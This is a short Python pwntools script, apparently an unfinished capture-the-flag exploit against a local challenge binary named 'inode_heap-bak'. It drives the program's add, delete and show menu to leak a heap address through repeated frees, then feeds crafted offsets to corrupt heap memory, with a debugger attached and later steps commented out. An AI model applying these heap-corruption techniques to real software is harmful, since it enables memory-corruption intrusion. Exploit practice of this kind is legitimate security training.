from pwn import *
context.log_level = 'debug'
context.aslr = False
def add(p, n, t):
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('>')
    p.sendline(str(t))
    p.recvuntil('your inode number:')
    p.sendline(str(n))

def delete(p, t):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('>')
    p.sendline(str(t))

def show(p, t):
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil('>')
    p.sendline(str(t))

def main():
    p = process('./inode_heap-bak')
    add(p, 0, 1)
    delete(p, 1)
    add(p, 0, 2)
    delete(p, 1)
    add(p, 0, 2)
    delete(p, 1)
    add(p, 0, 2)
    delete(p, 1)
    add(p, 0, 2)
    delete(p, 1)
    add(p, 0, 2)
    show(p, 1)
    p.recvuntil('inode number :')
    heap_low = int(p.recvuntil('\n', drop=True))
    if heap_low < 0:
        heap_low += 0x100000000
    log.success(hex(heap_low))
    delete(p, 2)
    add(p, heap_low, 1)
    delete(p, 2)
    add(p, heap_low, 1)
    delete(p, 2)
    add(p, (heap_low&0xffff)-0x208, 2)
    add(p, 0, 2)

    add(p, (heap_low&0xffff)+0xd0, 2)
    gdb.attach(p)

    add(p, 0, 1)

    delete(p, 1)

    # add(p, 0, 2)

    #add(p, (heap_low&0xffff)-0x8, 2)
    #add(p, 0x91, 1)
    #add(p, 0, 2)
    #delete(p, 2)


    p.interactive()


main()